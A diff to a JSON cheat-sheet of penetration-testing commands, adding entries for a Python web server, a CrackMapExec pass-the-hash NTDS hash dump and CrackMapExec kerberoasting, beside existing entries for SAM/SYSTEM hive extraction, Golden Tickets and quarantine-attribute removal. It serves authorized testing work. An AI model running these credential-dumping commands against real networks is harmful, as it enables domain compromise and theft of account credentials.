@@ -265,7 +265,6 @@
   {
     "description": "The xattr command can be used to display, modify or remove the extended attributes (like quarantine) of one or more files, including directories and symbolic links. Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).\n\nCommand Reference:\n```\nAttribute: com.apple.quarantine (Quarantine)\n\nApplication in quarantine: Bloodhoud.app\n```\n",
     "command": "xattr -d com.apple.quarantine Bloodhound.app\n",
-    "code": "extra code can be placed here. This part is optional and can be removed if not nessasary. \n",
     "items": [
       "Shell"
     ],
@@ -283,6 +282,28 @@
       "https://derflounder.wordpress.com/2012/11/20/clearing-the-quarantine-extended-attribute-from-downloaded-applications/"
     ],
     "name": "xaddr-quarantaine"
+  },
+  {
+    "description": "Python command to set up a webserver on the port you specify.\n\nCommand Reference:\n```\nPort: 80\n\n-b: 127.0.0.1 you can bind a specific interface to host the webserver on\n```\n",
+    "command": "python3 -m http.server 80\n",
+    "items": [
+      null
+    ],
+    "services": [
+      "Web"
+    ],
+    "OS": [
+      "Windows",
+      "Mac",
+      "Linux"
+    ],
+    "attack_types": [
+      "General"
+    ],
+    "references": [
+      "https://realpython.com/python-http-server/"
+    ],
+    "name": "python-webserver"
   },
   {
     "description": "Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account's password, which can then be bruteforced offline.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
@@ -1240,6 +1261,31 @@
     "name": "PKINIT-getnthash"
   },
   {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will dump the hashes from the DC in order to use them for lateral movement or crack passwords.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: Administrator\n\n\tPassword: password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
+    "command": "crackmapexec smb 10.10.10.1 -u Administrator -H 807726fcf9f188adc26eeafd7dc16bb7 --ntds\n",
+    "items": [
+      "Username",
+      "Password",
+      "Hash"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "Cracking"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki",
+      "https://www.hackingarticles.in/credential-dumping-ntds-dit/"
+    ],
+    "name": "Crackmapexec-SMB-NTDS"
+  },
+  {
     "description": "If a user has the SeBackupPrivilege or SeRestorePrivilege rights, which is default when a user is in the \"Backup Operators\" group. The user can backup the SAM and SYSTEM hashes, which can be usefull to start a Pass-The-Hash attack. With the commands it is possible to extract the SAM en SYSTEM hashes from the registry.\n\nCommand Reference:\n```\nRegister: hklm\\system & hklm\\sam\n```\n",
     "command": "reg save hklm\\system C:\\Users\\THMBackup\\system.hive\n",
     "code": "reg save hklm\\sam C:\\Users\\THMBackup\\sam.hive \n\nAfter retrieving use secretsdump:\nsecretsdump.py -sam '/path/to/sam.hive' -system '/path/to/system.hive' LOCAL\n",
@@ -1435,6 +1481,32 @@
       "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.3"
     ],
     "name": "Import-Module"
+  },
+  {
+    "description": "\"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.\" - https://github.com/byt3bl33d3r/CrackMapExec/wiki. This command will retrieve the Kerberos 5 TGS-REP etype 23 hash, which can be used to perform kerberoasting attack.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: Administrator\n\n\tPassword: Password123\n\n\tHash (-H):  807726fcf9f188adc26eeafd7dc16bb7\n",
+    "command": "crackmapexec ldap 10.10.10.1 -u Administrator -p 'Password123' --kerberoasting output.txt\n",
+    "items": [
+      "Username",
+      "Password",
+      "Hash"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration",
+      "Cracking"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/byt3bl33d3r/CrackMapExec",
+      "https://github.com/byt3bl33d3r/CrackMapExec/wiki",
+      "https://crackmapexec.popdocs.net/protocols/ldap-crackmapexec/kerberoasting",
+      "https://mayfly277.github.io/posts/GOADv2-pwning-part3/"
+    ],
+    "name": "Crackmapexec-LDAP-Kerberoasting"
   },
   {
     "description": "Impacket's ticketer.py can perform Golden Ticket attacks, which crafts a valid TGT ticket using a valid user's NTLM hash. It is then possible to access any service using the TGT by requesting a TGS for that service.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tHash: b18b4b218eccad1c223306ea1916885f\n\n\tDomain SID: S-1-5-21-1339291983-1349129144-367733775\n",
